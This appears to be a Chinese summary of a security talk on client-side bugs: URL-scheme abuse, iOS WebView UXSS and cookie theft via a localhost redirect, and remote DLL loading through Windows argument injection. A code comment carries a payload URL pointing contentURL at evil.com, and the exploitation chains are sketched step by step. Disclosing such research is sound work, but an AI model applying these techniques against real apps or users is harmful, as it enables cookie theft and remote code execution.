### 文本优化

#### 1. 根据 `contentURL` 拼接 `Info.plist` 的地址
- **要求**：无任何域名限制，只需支持 CORS。
- **数据结构**：`Info.plist` 是一个 JSON 数组，用于标记文档可用的本地化语言（locale）。
- **数据加载**：根据所选语言加载相应的国际化数据文件 `content.json`。例如，选择英语时，将加载 `/English.lproj/content.json`。

```javascript
// 示例代码
var targetIDContent = dataController.getContentForObjectWithID(targetID);
$content.append(targetIDContent); // /?lang=en&contentURL=//evil.com/
```

#### 2. 文件路径示例
- `/Info.json`
- `/English.lproj/contentjson-version.txt`
- `/English.lproj/content.json`

#### 3. 利用 macOS Mojave 或更早版本上的 NFS
- 可以全盘读取文件。
- 不同于 `help:` 协议，不支持 AppleScript。
- 可打开除 `file:///` 外的所有 URL 方案。
- WebView 没有沙箱但也没有 JIT 编译器。
- 任何 DOM 漏洞都可能导致完整的远程代码执行权限，如 SQLite 在 Pwn2Own 中的利用案例。

#### 4. iOS App 跨应用获取 Cookie
- 使用 `app://` 协议在 App WebView 中打开指定 URL。
- 限定了 `example.com` 域名。
- 由于历史原因，存在一个解析到本地 IP 的域名 `localhost.example.com -> 127.0.0.1`。
- 利用方式：通过 `app://webview?url=http://localhost.example.com` 跳转到受害 App，从而读取一级域名下的 Cookie 并调用更多敏感功能。

#### 5. iOS WebView UXSS
- UIWebView 默认允许 `allowUniversalAccessFromFileURLs`。
- 从 `file:///` 域加载可控的 HTML 可导致 UXSS。
- 可以读取 App 内任意文件及访问远程 HTTP 地址。
- 典型场景包括私信、网盘共享文件、HTML 电子书等。
- UIWebView 已被弃用，但在一些老旧资料中仍可能误导开发者。

#### 6. 某社交网络 iOS 官方客户端
- 私信发送特定链接即可触发漏洞。
- 如果鉴权出现问题，可以通过劫持 `window.location` 对象来绕过安全检查。
- 截至 2021 年 6 月，Safari 仍然允许覆盖 `window.location`。

#### 7. 某视频客户端远程 DLL 注入
- Windows 下的 URL Scheme 和运行命令使用了同一个 API `ShellExecute`。
- 存在参数注入风险，如 Electron 的 CVE-2018-1000006。
- 利用 LoadLibrary 加载本地或远程 DLL 文件，通过 DllMain 的 `DLL_PROCESS_ATTACH` 事件进行后门操作。
- 使用 SMB 或 WebDAV 协议加载远程 DLL 文件。

#### 8. 最终利用
- 浏览器点击恶意网页，向 `127.0.0.1` 发起请求即可触发漏洞。
- 甚至不需要 JavaScript，只需简单的标签即可。
- 远程攻击可以在局域网内实现，只要知道对方 IP 地址。

#### 9. 小结
- 本文分析了多个平台上的客户端软件漏洞。
- 攻击面包括 URL scheme、桌面端开放端口（特别是 HTTP 服务）以及难以简单分类的复杂条件组合。

感谢聆听！